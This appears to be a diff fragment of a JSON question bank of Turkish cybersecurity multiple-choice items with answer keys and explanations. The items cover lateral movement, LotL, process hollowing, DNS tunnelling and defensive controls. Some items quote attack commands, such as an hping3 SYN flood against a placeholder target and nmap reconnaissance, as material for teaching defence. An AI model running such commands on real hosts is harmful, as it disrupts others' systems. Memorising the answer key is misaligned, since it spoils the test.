+      "A": "SMB servisi yeniden başlatıldığında aktif bağlantılar yeniden kuruluyor, bu normaldir",
+      "B": "İç ağda bir sistemin SMB üzerinden lateral movement için diğer sistemleri taradığına işaret eder; EternalBlue veya benzeri exploit denemeleri olabilir",
+      "C": "Domain Controller'ın Active Directory replikasyon trafiği anormal görünüyordur",
+      "D": "Backup yazılımının 445 üzerinden incremental yedekleme yaptığına ve bağlantı hatalarına işaret eder"
+    },
+    "correct": "B",
+    "explanation": "445 portu SMB (Server Message Block) için kullanılır. İç ağdan 445'e yaygın başarısız bağlantı denemeleri klasik lateral movement taramasıdır. WannaCry, NotPetya ve birçok APT bu port üzerinden EternalBlue exploitini kullanmıştır.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 152,
+    "question": "PKI sisteminde 'Certificate Pinning' ne anlama gelir ve hangi saldırıyı önler?",
+    "options": {
+      "A": "Belirli bir CA'nın sertifikasının cihaz güven deposuna eklenmesi; yeni CA'ların otomatik güvenilmesini engeller",
+      "B": "Uygulama veya cihazın yalnızca belirli bir sertifikayı veya public key'i geçerli sayması; sahte CA ile oluşturulan MITM sertifikalarını reddeder",
+      "C": "Sertifikanın son kullanma tarihinin uzatılarak yenileme gerekmeden sabitlenmesi",
+      "D": "Sertifika şeffaflık günlüklerine (CT Log) sertifikanın kaydedilerek değiştirilemez hale getirilmesi"
+    },
+    "correct": "B",
+    "explanation": "Certificate Pinning, uygulama veya cihazın belirli bir sertifika veya public key ile iletişim kurması gerektiğini kodlar. Saldırgan sahte CA ile geçerli görünen bir sertifika oluştursa bile pinned uygulama bu sertifikayı reddeder.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 153,
+    "question": "Bir Red Team operasyonunda 'Living off the Land (LotL)' tekniği kullanılıyor. Bu ne anlama gelir?",
+    "options": {
+      "A": "Saldırgan yalnızca açık kaynaklı araçlar kullanır; ticari araçların maliyetinden kaçınmak için tercih edilir",
+      "B": "Saldırgan sistemde zaten mevcut olan meşru araçları (PowerShell, certutil, WMI, rundll32) kullanarak zararlı aktivite gerçekleştirir; tespit edilmesi güçtür",
+      "C": "Saldırgan uzak sistemlere sızmak yerine yalnızca hedef ağda fiziksel erişim arar",
+      "D": "Saldırgan meşru ticari yazılımların lisanslı kopyalarını kullanarak imza tabanlı tespiti atlatır"
+    },
+    "correct": "B",
+    "explanation": "LotL (Living off the Land), saldırganın hedef sistemdeki meşru Windows araçlarını (PowerShell, certutil, mshta, wscript) kullanmasıdır. Bu araçlar güvenilir binary olduğundan imza tabanlı antivirüs atlatılır. Davranış tabanlı tespit ve application whitelisting bu tekniğe karşı daha etkilidir.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 154,
+    "question": "DNSSEC doğrulaması yapılan bir sorguda 'SERVFAIL' yanıtı alınıyor ancak DNSSEC devre dışıyken aynı sorgu başarılı oluyor. Bu durum ne anlama gelir?",
+    "options": {
+      "A": "DNSSEC'in zone imzası süresi dolmuş veya imza geçersiz; zone'un bütünlüğü doğrulanamıyor",
+      "B": "Hedef domain DNSSEC'i desteklemiyor; uyumsuz DNS sunucusu SERVFAIL üretiyor",
+      "C": "DNS sunucusu cache'i dolmuş; DNSSEC sorguları daha fazla kayıt gerektirdiğinden önbellek sorununa yol açıyor",
+      "D": "Firewall DNSSEC paketlerini (büyük UDP boyutları) engelliyor; bu bir ağ yapılandırma sorunudur"
+    },
+    "correct": "A",
+    "explanation": "DNSSEC doğrulayıcı bir DNS sunucusu (BIND, Unbound) imzaları doğrulayamazsa SERVFAIL döndürür. Bu genellikle RRSIG (imza kaydı) süresi dolmuş, zone yeniden imzalanmamış veya anahtar rollover düzgün yapılmamışken oluşur. DNS Poisoning durumunda da benzer hata görülebilir.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 155,
+    "question": "Bir kuruluş 'Purple Team' tatbikatı yapıyor. Red Team bir teknik kullanıyor ve Blue Team'in bunu tespit edip etmediği anlık olarak paylaşılıyor. Bu yöntemin 'Red vs Blue' ayrı çalışmasına göre avantajı nedir?",
+    "options": {
+      "A": "Purple Team tatbikatları Red Team'in tekniklerini gizli tutmasına olanak tanıdığından daha gerçekçi sonuçlar verir",
+      "B": "Gerçek zamanlı iletişim ve bilgi paylaşımı, tespit boşluklarının hemen belirlenmesini ve Blue Team savunmasının anında iyileştirilmesini sağlar",
+      "C": "Purple Team'de saldırı ve savunma aynı kişiler tarafından yapıldığından maliyet avantajı elde edilir",
+      "D": "Ayrı çalışmada Red Team raporunu sunana kadar Blue Team açık kalırken Purple Team bu süreyi sıfıra indirir"
+    },
+    "correct": "B",
+    "explanation": "Purple Team'in değeri döngüsel öğrenmedir: Red teknik kullanır → Blue tespit edip etmediğini söyler → tespit yoksa kural/log geliştirilir → tekrar test edilir. Bu süreç savunma kapasitesini hızla artırır. Klasik Red/Blue'da bu döngü hafta veya aylar alabilir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 156,
+    "question": "Bir analist `netstat -an` çıktısında `0.0.0.0:4444 LISTEN` görüyor. Bu durum neyi akla getirir?",
+    "options": {
+      "A": "Normal bir web servisi 4444 portunu dinliyor; bu bazı uygulamalarda standarttır",
+      "B": "4444 portu Metasploit'in varsayılan dinleme portudur; bu durum reverse shell veya C2 bağlantısını akla getirir ve incelenmesi gerekir",
+      "C": "Güvenlik duvarı tarafından engellenen bir port yeniden yönlendirilmiş olabilir",
+      "D": "IPv6 geçiş mekanizması olan Teredo, 4444 portunu kullandığından bu normaldir"
+    },
+    "correct": "B",
+    "explanation": "Port 4444, Metasploit'in varsayılan meterpreter/shell listener portudur. Üretim sisteminde bu portun dinleniyor olması ciddi bir uyarıdır. Süreci (PID) belirleyip (`netstat -anp` veya `ss -tulnp`) inceleyin; bilinmeyen process reverse shell veya backdoor olabilir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 157,
+    "question": "RADIUS sunucusunda 'Access-Challenge' mesajı ne anlama gelir?",
+    "options": {
+      "A": "Kimlik doğrulama başarısız; kullanıcının bağlantısı reddedildi",
+      "B": "Sunucu ek kimlik doğrulama faktörü istiyor; EAP gibi çok adımlı protokollerde OTP veya sertifika adımını başlatır",
+      "C": "Kullanıcı yetkilendirildi ancak bazı ağ kısıtlamaları uygulanacak",
+      "D": "Kimlik doğrulama işlemi zaman aşımına uğradı; istemci yeniden denemelidir"
+    },
+    "correct": "B",
+    "explanation": "RADIUS mesaj tipleri: Access-Request (istek), Access-Accept (kabul), Access-Reject (red), Access-Challenge (ek bilgi iste). Challenge, MFA/OTP veya EAP gibi çok adımlı kimlik doğrulamada sunucunun ek bilgi istediğini belirtir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 158,
+    "question": "Bir web uygulamasında `Content-Security-Policy: default-src 'self'` başlığı hangi saldırıyı önlemeye yönelik olarak tasarlanmıştır?",
+    "options": {
+      "A": "SQL Injection; kullanıcı girdilerini sunucu tarafında filtreler",
+      "B": "CSRF; cross-origin isteklerin doğrulanmasını sağlar",
+      "C": "XSS; harici kaynaklardan script yüklemeyi kısıtlayarak inline script çalıştırılmasını önler",
+      "D": "Directory Traversal; dosya yolu isteklerini kısıtlar"
+    },
+    "correct": "C",
+    "explanation": "CSP (Content Security Policy) başlığı, tarayıcıya hangi kaynaklardan içerik yüklenebileceğini söyler. `default-src 'self'` yalnızca aynı orijinden içerik yüklenmesine izin verir. Bu, saldırganın harici kaynaklardan script yüklemesini önleyerek XSS etkisini azaltır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 159,
+    "question": "Kill Chain modelinde 'Command and Control (C2)' aşamasının engellenmesi diğer aşamaların engellenmesinden neden farklı bir stratejik değer taşır?",
+    "options": {
+      "A": "C2 aşaması en az maliyetli savunmayı gerektirdiğinden engellemek daha ekonomiktir",
+      "B": "C2 engellenir ise saldırgan sisteme girmiş olsa bile sonraki aşamalara geçemez; saldırganın tüm önceki yatırımı (Reconnaissance, Weaponization vb.) boşa gider",
+      "C": "C2 aşaması her zaman ağ trafiği ürettiğinden tespit en kolay bu noktada yapılır",
+      "D": "Önceki aşamalarda tespit başarısız olursa C2 tek erişim noktası olduğundan tek etkili savunma çizgisidir"
+    },
+    "correct": "B",
+    "explanation": "C2 engellemek, saldırganın komuta altyapısını işlevsiz kılar. Zararlı yazılım sisteme girmiş ve kurulmuş olsa bile C2 sunucusuna ulaşamazsa komut alamaz, veri sızdıramaz, aktif operasyonu gerçekleştiremez. Bu, saldırganın önceki tüm yatırımını sıfırlar.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 160,
+    "question": "Bir saldırgan 'Business Email Compromise (BEC)' saldırısında CEO'nun e-posta hesabını taklit ediyor. Bu saldırının hangi özelliği onu özellikle tehlikeli kılar?",
+    "options": {
+      "A": "Teknik exploit gerektirdiğinden yalnızca ileri seviye saldırganlar tarafından uygulanabilir",
+      "B": "Kötü amaçlı link veya ek içermeyebilir; yalnızca meşru bir e-posta gibi görünen talep içerir ve geleneksel güvenlik filtreleri tarafından yakalanmaz",
+      "C": "Şifreli iletişim kullandığından MITM ile tespit edilemez",
+      "D": "Otomatik araçlarla büyük ölçekte gerçekleştirilebilir; bu nedenle hedeflenen şirket sayısı çok yüksektir"
+    },
+    "correct": "B",
+    "explanation": "BEC'in tehlikesi teknik değil sosyal mühendislik boyutundadır. E-posta 'Acil: şu hesaba X TL havale edin' gibi içerik taşır, zararlı ek veya link yoktur. Spam/AV filtreleri bunu geçer. Finansal dolandırıcılık kayıpları dünya genelinde milyarlarca dolar düzeyindedir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 161,
+    "question": "Bir güvenlik denetiminde WPS'in aktif olduğu ve PIN metodunun etkin olduğu bulunuyor. 'Pixie Dust Attack' nasıl çalışır?",
+    "options": {
+      "A": "WPS PIN'inin tüm 8 haneli kombinasyonlarını brute force ile deneyerek kısa sürede çözer",
+      "B": "Bazı router üreticilerinin zayıf rastgele sayı üreteci kullanmasından yararlanarak WPS nonce değerlerini analiz eder ve PIN'i çok az denemeyle (hatta tek seferde) kırar",
+      "C": "WPS anlaşma trafiğini yakalayarak PMKID'yi offline brute force ile kırar",
+      "D": "Router'ı sürekli WPS istekleriyle boğarak yeniden başlatmaya zorlar ve fabrika ayarlarına döndürür"
+    },
+    "correct": "B",
+    "explanation": "Pixie Dust, bazı router firmware'lerinin WPS Diffie-Hellman için kriptografik açıdan zayıf rastgele sayı ürettiği bulgusuna dayanır. Saldırgan nonce değerlerinden PSK türetebilir. Standart brute force 11.000 deneme gerektirirken Pixie Dust bazı cihazlarda tek denemede başarılı olur.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 162,
+    "question": "Forensic analizde 'volatile data' öncelikli toplanır. Bu sıralama neden önemlidir?",
+    "options": {
+      "A": "Volatile data daha büyük boyutlu olduğundan disk dolmadan önce toplanması gerekir",
+      "B": "RAM içeriği, açık ağ bağlantıları ve çalışan süreçler sistem kapatılınca yok olur; bunların disk verisinden önce toplanması forensic değeri korur",
+      "C": "Volatile data mahkemede disk verisinden daha geçerli delil olarak kabul edildiğinden önce toplanır",
+      "D": "Antivirüs yazılımları volatile veriyi tarama sırasında bozabildiğinden taramadan önce kopyalanmalıdır"
+    },
+    "correct": "B",
+    "explanation": "Forensic veri toplama sırasında volatility sırasına göre ilerlenir: Registers/cache → RAM → Swap → Ağ bağlantıları → Disk → Arşiv. Sistem kapatılınca RAM, aktif bağlantılar ve process listesi tamamen kaybolur. Fileless malware yalnızca RAM'de olduğundan memdump kritiktir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 163,
+    "question": "Bir analist Wireshark'ta HTTP trafiğini incelerken kullanıcı adı ve şifrenin Base64 formatında 'Authorization: Basic' başlığında gönderildiğini görüyor. Bu ne anlama gelir?",
+    "options": {
+      "A": "Kimlik bilgileri şifreli olduğundan trafiği dinleyen üçüncü taraf okuyamaz; Base64 bir şifreleme yöntemidir",
+      "B": "Basic Authentication kullanılmış ve HTTP üzerinden gönderilmiş; Base64 yalnızca kodlama (encoding) yapar, şifreleme değil. Ağı dinleyen herkes çözebilir",
+      "C": "HTTPS kullanılmadığından yalnızca Wireshark gibi özel araçlarla okunabilir; normal ağ izleme bu veriyi göremez",
+      "D": "Bu bir token tabanlı kimlik doğrulama mekanizmasıdır; Base64 token güvenli biçimde iletilmektedir"
+    },
+    "correct": "B",
+    "explanation": "Base64 bir encoding yöntemidir, şifreleme değil. `echo 'dXNlcjpwYXNz' | base64 -d` komutuyla anında çözülür. Basic Auth yalnızca HTTPS üzerinde kullanılmalıdır; HTTP üzerinde Wireshark veya tcpdump ile kolayca ele geçirilir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 164,
+    "question": "MITRE ATT&CK'ta 'Tactic' ve 'Technique' arasındaki fark nedir?",
+    "options": {
+      "A": "Tactic belirli araçları, Technique ise bunların hangi amaçla kullanıldığını tanımlar",
+      "B": "Tactic saldırganın 'neden yaptığını' (hedef/amaç), Technique ise 'nasıl yaptığını' (yöntem) tanımlar",
+      "C": "Tactic ileri seviye saldırganlar için, Technique ise script kiddie düzeyindeki saldırılar için kullanılır",
+      "D": "Tactic savunma ekibinin önlemleri, Technique ise saldırganların araçlarıdır"
+    },
+    "correct": "B",
+    "explanation": "Örnek: Tactic = 'Persistence' (kalıcılık sağlamak amacı). Technique = 'T1547.001 — Registry Run Keys' (bunu gerçekleştirme yöntemi). Her Tactic altında onlarca Technique ve Sub-technique olabilir. Bu ayrım Threat Hunting hipotezleri kurmayı kolaylaştırır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 165,
+    "question": "Bir şirkette DLP sistemi 'false positive' oranı çok yüksek; gerçek iş e-postaları da engelleniyor. Bu sorunu çözmek için hangi yaklaşım tercih edilir?",
+    "options": {
+      "A": "DLP sistemini tamamen devre dışı bırakıp yalnızca manuel incelemeye geçmek",
+      "B": "DLP kurallarını daha geniş tutarak daha az içeriği şüpheli olarak işaretlemek",
+      "C": "Kural motorunu hassaylaştırmak (tuning); bağlam bazlı politikalar, whitelist ve departman bazlı istisnalar ekleyerek False Positive oranını düşürmek",
+      "D": "DLP'yi yalnızca gece saatlerinde aktif tutmak; mesai saatleri dışındaki veri transferlerini izlemek"
+    },
+    "correct": "C",
+    "explanation": "DLP tuning, False Positive ile False Negative arasındaki dengeyi kurmaktır. Çok hassas kural meşru işleri engeller (False Positive), çok geniş kural gerçek sızıntıyı kaçırır (False Negative). Bağlam (kim gönderdi, hangi departman, hangi hedef), whitelist ve exception politikaları bu dengeyi düzenler.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 166,
+    "question": "Bir saldırgan hedef ağa erişim sağladıktan sonra 'Pass the Ticket' saldırısı yapıyor. Bu, Pass the Hash'ten nasıl farklıdır?",
+    "options": {
+      "A": "Pass the Ticket kullanıcı adı gerektirmez; Pass the Hash hem kullanıcı adı hem hash gerektirir",
+      "B": "Pass the Ticket, Kerberos bileti (TGT veya ST) kullanarak kimlik doğrulaması yaparken; Pass the Hash NTLM hash değerini kullanır",
+      "C": "Pass the Ticket yalnızca Linux sistemlerde, Pass the Hash ise yalnızca Windows sistemlerde geçerlidir",
+      "D": "Pass the Ticket web uygulamalarını, Pass the Hash ise ağ servislerini hedefler"
+    },
+    "correct": "B",
+    "explanation": "Pass the Hash: NTLM hash değeriyle kimlik doğrulama yapar. Pass the Ticket: Kerberos ortamında ele geçirilmiş TGT veya Servis Bileti kullanır — 'Golden Ticket' (sahte TGT) ve 'Silver Ticket' (sahte ST) bu tekniğin gelişmiş versiyonlarıdır.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 167,
+    "question": "Bir organizasyon 'Tabletop Exercise' yapıyor. Bu tatbikatın gerçek bir Incident Response tatbikatından farkı ve amacı nedir?",
+    "options": {
+      "A": "Tabletop, ekibin pratik saldırı tekniklerini öğrendiği hands-on eğitim; gerçek tatbikat ise yalnızca yazılı sınav",
+      "B": "Tabletop, gerçek sistemlere dokunmadan masa başında senaryo tartışmasıdır; ekibin karar alma süreçlerini, iletişim kanallarını ve plan eksikliklerini test eder",
+      "C": "Tabletop yalnızca üst yönetim katılımıyla yapılır; teknik ekip dahil edilmez",
+      "D": "Tabletop, otomatik SOAR playbook'larını test eden simülasyon platformudur; insan kararı gerektirmez"
+    },
+    "correct": "B",
+    "explanation": "Tabletop Exercise, gerçek sistemlere dokunmadan masa etrafında yapılan senaryo bazlı tartışmadır. 'Saldırı tespit edildi, şimdi ne yapıyoruz?' sorusunun tartışıldığı bu tatbikat, planların tutarlılığını, iletişim aksaklıklarını ve karar boşluklarını ortaya çıkarır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 168,
+    "question": "Bir saldırgan `hping3 -S -p 80 --flood hedef_ip` komutu çalıştırıyor. Savunma tarafında bu saldırıya karşı hangi mekanizma ön saflarda durur?",
+    "options": {
+      "A": "Application firewall (WAF); HTTP flood'larını uygulama katmanında filtreler",
+      "B": "Network-level rate limiting ve SYN proxy/SYN Cookie mekanizması; kaynak IP bazlı SYN oranını sınırlayarak half-open bağlantı tablosunun dolmasını önler",
+      "C": "IDS imza kuralı; hping3 araç parmak izini tanıyarak alarmları tetikler",
+      "D": "DNS sinkholing; saldırganın alan adını boş IP'ye yönlendirerek iletişimi keser"
+    },
+    "correct": "B",
+    "explanation": "hping3 --flood ile SYN Flood simülasyonu yapılmaktadır. SYN Proxy veya SYN Cookie, sunucunun bellek tablosunu korur; gerçek 3-way handshake tamamlanana kadar bağlantı kaydı tutmaz. Rate limiting ise kaynak bazında SYN oranını sınırlar.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 169,
+    "question": "Bir forensic analistin bir Windows sistemde `Get-EventLog Security | Where-Object {$_.EventID -eq 4624} | Select-Object TimeGenerated, Message` komutu çalıştırmasının amacı nedir?",
+    "options": {
+      "A": "Başarısız giriş denemelerini listelemek; EventID 4624 brute force saldırılarını kaydeder",
+      "B": "Başarılı giriş olaylarını listelemek; EventID 4624 Windows'ta başarılı oturum açmayı kaydeder",
+      "C": "Yönetici hesabı değişikliklerini listelemek; 4624 grup üyeliği değişikliklerini izler",
+      "D": "Servis yükleme olaylarını listelemek; 4624 yeni servis kurulumlarını kaydeder"
+    },
+    "correct": "B",
+    "explanation": "Windows Security EventID: 4624 = Başarılı logon, 4625 = Başarısız logon, 4648 = Explicit credential kullanımı, 4672 = Özel ayrıcalıkla logon (admin). Forensic analizde 4624'ü sorgulamak sistemde başarılı girişlerin zaman çizelgesini ortaya koyar.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 170,
+    "question": "Bir analist `curl -v https://target.com` çalıştırıyor ve TLS handshake detaylarında 'TLSv1.0' görüyor. Bu neden bir güvenlik sorunudur?",
+    "options": {
+      "A": "TLS 1.0 daha yavaş çalışır; performans sorunu oluşturur ancak güvenlik açığı değildir",
+      "B": "TLS 1.0, POODLE ve BEAST gibi bilinen kriptografik saldırılara karşı savunmasızdır; TLS 1.2 minimum, TLS 1.3 tercih edilmelidir",
+      "C": "TLS 1.0 yalnızca HTTP'yi desteklediğinden HTTPS bağlantıları için kullanılmamalıdır",
+      "D": "TLS 1.0'ın sertifika imzalama algoritması SHA-1 ile sınırlı olduğundan sadece eski sertifikalar geçerlidir"
+    },
+    "correct": "B",
+    "explanation": "TLS 1.0 (1999) ve 1.1 (2006), POODLE, BEAST gibi saldırılara karşı savunmasız protokollerdir. PCI-DSS ve birçok güvenlik standardı minimum TLS 1.2 zorunlu kılar. TLS 1.3 eski kriptografik yöntemleri tamamen kaldırmış ve el sıkışmayı hızlandırmıştır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 171,
+    "question": "Bir saldırgan hedef sistemde çalıştırdığı zararlı yazılımın antivirüs tespitini atlatmak için 'process hollowing' tekniğini kullanıyor. Bu teknik ne anlama gelir?",
+    "options": {
+      "A": "Zararlı yazılım güvenilir bir process içine kendi DLL'ini enjekte eder ve process'in belleğini kademeli olarak değiştirir",
+      "B": "Meşru bir process başlatılır, belleği boşaltılır ve zararlı kod aynı process alanına yüklenerek meşru process gibi çalıştırılır",
+      "C": "Zararlı yazılım birden fazla process parçasına bölünerek tek başına hiçbiri şüpheli görünmez",
+      "D": "Zararlı yazılım sistem çağrılarını (syscall) doğrudan çağırarak AV hook'larını atlatır"
+    },
+    "correct": "B",
+    "explanation": "Process Hollowing (Process Replacement): Meşru process (örn. svchost.exe) Suspended durumda başlatılır, belleği unmapped edilir (hollowed), zararlı kod aynı adrese yazılır ve çalıştırılır. Process listesinde meşru isim görünür; AV imza tespitini atlatır.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 172,
+    "question": "SOAR platformunda 'false positive' alarmını kapatan bir analist hangi riski üstlenir?",
+    "options": {
+      "A": "SOAR platformunun lisans maliyetini artırabilir; fazla alarm kapatma ek kapasiteye ihtiyaç duyurur",
+      "B": "Gerçek bir saldırıyı yanlışlıkla false positive olarak etiketleyebilir; bu 'alarm yorgunluğu' kökenli bir False Negative hatasıdır",
+      "C": "SIEM korelasyon kurallarını otomatik olarak değiştirebilir; yanlış kapatma kural motorunu bozabilir",
+      "D": "Kapatılan alarm logu silindiğinden ileride yapılacak forensic analiz için veri kaybı oluşabilir"
+    },
+    "correct": "B",
+    "explanation": "Alert Fatigue'ün en tehlikeli sonucu, gerçek bir saldırının 'bu da yanlış pozitif olsa gerek' düşüncesiyle kapatılmasıdır. Bu nedenle kapatma işlemi belgelenmeli, nedenlendirilmeli ve periyodik olarak gözden geçirilmelidir. Bazı organizasyonlar ikinci bir analist onayı gerektirir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 173,
+    "question": "Bir web sunucusunda `X-Frame-Options: DENY` HTTP başlığı neyi önler?",
+    "options": {
+      "A": "XSS saldırılarını; harici sitelerden script yüklenmesini engeller",
+      "B": "Clickjacking saldırılarını; sayfanın başka bir siteye iframe içine gömülmesini engelleyerek kurbanın farkında olmadan tıklamasını önler",
+      "C": "CSRF saldırılarını; cross-origin form gönderimlerini reddeder",
+      "D": "Directory traversal saldırılarını; sunucu dizin yapısının görünmesini engeller"
+    },
+    "correct": "B",
+    "explanation": "Clickjacking'de saldırgan kurbanın güvendiği siteyi görünmez iframe içine gömer ve üstüne cazip bir buton yerleştirir. Kurban 'buton'a tıklarken aslında iframe'deki işlemi onaylar. `X-Frame-Options: DENY` bu sayfanın iframe'e gömülmesini tamamen engeller.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 174,
+    "question": "Bir organizasyon 'Threat Intelligence' beslemesi olarak TAXII/STIX protokollerini kullanıyor. Bu protokoller neyi sağlar?",
+    "options": {
+      "A": "Ağ trafiğini gerçek zamanlı izleyerek IOC'leri otomatik tespit eder ve bloklar",
+      "B": "STIX tehdit istihbarat verilerini standart formatta tanımlar; TAXII ise bu verilerin organizasyonlar arasında otomatik paylaşımını sağlar",
+      "C": "Saldırı simülasyonlarını standart senaryolara göre yürütür ve sonuçları raporlar",
+      "D": "Güvenlik açıklarını CVE formatında sınıflandırır ve CVSS puanı hesaplar"
+    },
+    "correct": "B",
+    "explanation": "STIX (Structured Threat Information eXpression) IOC'leri, TTP'leri ve tehdit aktörlerini standart JSON formatında tanımlar. TAXII (Trusted Automated eXchange of Intelligence Information) ise bu verilerin HTTP üzerinden otomatik paylaşım protokolüdür. SIEM ve SOAR entegrasyonunda kullanılır.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 175,
+    "question": "Bir saldırgan DNS sorgu trafiğini C2 iletişimi için kullanıyor. Bu teknik neden normal güvenlik araçları tarafından tespit edilmesi zor olan bir vektördür?",
+    "options": {
+      "A": "DNS trafiği her zaman şifreli olduğundan içerik analizi yapılamaz",
+      "B": "Kurumsal ağlar DNS çözümleme için dışarıya trafik açmak zorundadır; DNS sorguları genellikle filtrelenmez ve DNS tünelleme bu meşru trafiğe gizlenebilir",
+      "C": "DNS trafik hacmi çok düşük olduğundan SIEM sistemleri bu protokolü izlemez",
+      "D": "DNS yalnızca UDP kullanır ve UDP paketleri firewall tarafından incelenmez"
+    },
+    "correct": "B",
+    "explanation": "DNS Tunneling, veriyi DNS sorgu ve yanıtlarına gizleyerek C2 iletişimi veya data exfiltration için kullanır. DNS trafiği çoğu kurumda 53 portunda serbestçe akar; içerik analizi yapılmaz. Anomali tespiti (olağandışı uzun subdomainler, yüksek sorgu sayısı) ve DNS filtreleme savunma yöntemleridir.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 176,
+    "question": "Bir analist `grep -r 'password' /var/log/ 2>/dev/null | grep -v 'Failed'` komutunu çalıştırıyor. Komutun ikinci bölümü (`grep -v 'Failed'`) ne yapar?",
+    "options": {
+      "A": "Büyük/küçük harf duyarsız arama yapar; 'Failed' kelimesini büyük harfle de arar",
+      "B": "Tüm log satırlarından 'Failed' içerenleri hariç tutarak yalnızca 'Failed' geçmeyen 'password' içeren satırları gösterir",
+      "C": "Hata çıktılarını (stderr) dosyaya kaydeder; 'Failed' içeren hatalar ayrı loglanır",
+      "D": "Komutun çalışma hızını artırır; 'Failed' kelimesi bulunan büyük log bloklarını atlar"
+    },
+    "correct": "B",
+    "explanation": "`grep -v` (invert match), belirtilen deseni içeren satırları sonuçtan çıkarır. Bu kombo: önce 'password' içeren tüm log satırlarını bulur, sonra bunların içinden 'Failed' geçenleri eleler. Başarılı parola aktivitesini veya cleartext parola ifşasını aramak için kullanılır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 177,
+    "question": "HIPS (Host-based IPS) ve EDR arasındaki temel fark nedir?",
+    "options": {
+      "A": "HIPS daha yeni bir teknolojidir; EDR'nin gelişmiş versiyonudur",
+      "B": "HIPS öncelikle imza tabanlı çalışır ve bilinen saldırıları anlık engeller; EDR ise davranış analizi ve telemetri ile derin görünürlük sunarak bilinmeyen tehditleri de tespit eder ve forensic soruşturmayı mümkün kılar",
+      "C": "HIPS ağ trafiğini, EDR ise yalnızca disk aktivitelerini izler",
+      "D": "EDR yalnızca büyük kurumsal ortamlarda, HIPS ise bireysel bilgisayarlarda kullanılır"
+    },
+    "correct": "B",
+    "explanation": "HIPS belirli davranışları veya imzaları gerçek zamanlı engeller. EDR daha kapsamlıdır: tüm endpoint aktivitelerini (process, ağ, registry, dosya) kaydeder, davranış analizi yapar, tehdit avlama (threat hunting) ve forensic soruşturmayı destekler.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 178,
+    "question": "Bir kuruluş 'Separation of Duties' ilkesini uyguluyor. Bu ilkenin güvenlik açısından en önemli katkısı nedir?",
+    "options": {
+      "A": "Her görevi daha iyi yapan uzmanlaşmış çalışanlar sayesinde sistem güvenilirliği artar",
+      "B": "Tek bir çalışanın hem kötü niyetli bir eylemi gerçekleştirip hem de gizlemesini zorlaştırır; içeriden sahtekârlık için ortak hareket (collusion) gerektirir",
+      "C": "Erişim yönetimi otomasyonu kolaylaşır; rol bazlı sisteme geçiş daha kolay yapılır",
+      "D": "Sistem bakımları sırasında yetki boşluklarını önler; her zaman bir sorumlu bulunur"
+    },
+    "correct": "B",
+    "explanation": "Separation of Duties, bir kişinin hem işlemi yapıp hem kontrol edemeyeceğini garanti eder. Örneğin para transferi yapan ile onaylayan farklı kişilerdir. Bu yapıda sahtekârlık için iki kişinin iş birliği (collusion) gerekmesi riski önemli ölçüde artırır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 179,
+    "question": "Bir saldırgan ağı keşfederken sadece `nmap -sn 192.168.1.0/24` komutu kullanıyor. Bu komut ne yapar ve neden tercih edilir?",
+    "options": {
+      "A": "192.168.1.0/24 ağındaki tüm portları SYN scan ile tarar; `-sn` stealth modu aktifleştirir",
+      "B": "Yalnızca host keşfi (ping sweep) yapar, port taraması yapmaz; aktif cihazları tespit ederken minimum iz bırakır",
+      "C": "Yalnızca açık 443 portunu tarar; HTTPS üzerinden ağ haritalaması yapar",
+      "D": "Ağdaki tüm servis sürümlerini ve işletim sistemlerini sessizce tespit eder"
+    },
+    "correct": "B",
+    "explanation": "`-sn` (eski adıyla -sP) port taramasını devre dışı bırakır; yalnızca ICMP, ARP, TCP SYN/ACK ping'leri ile canlı hostları tespit eder. Bu Reconnaissance'ın başında 'kim var?' sorusunu yanıtlamak için kullanılır; port taraması sonraki adımdır ve çok daha fazla alarm üretir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 180,
+    "question": "Bir organizasyon 'Cyber Insurance' (Siber Sigorta) satın alıyor. Risk yönetimi çerçevesinde bu hangi stratejiye karşılık gelir?",
+    "options": {
+      "A": "Risk Mitigation (Azaltma); sigorta şirketi teknik önlem alarak riski azaltır",
+      "B": "Risk Transfer (Transfer); olası finansal kayıp riski sigorta şirketine aktarılır",
+      "C": "Risk Avoidance (Kaçınma); sigorta sayesinde riskli sistemler kullanılmaz hale gelir",
+      "D": "Risk Acceptance (Kabul); sigorta sayesinde riskin farkında olunduğu belgelenir"
+    },
+    "correct": "B",
+    "explanation": "Risk yönetim stratejileri: Mitigation (kontrollerle azalt), Transfer (sigorta/üçüncü taraf), Acceptance (kabul et), Avoidance (riskli aktiviteden kaçın). Siber sigorta, güvenlik olayı sonrası oluşacak finansal kayıpları sigorta şirketine transfer eder.",
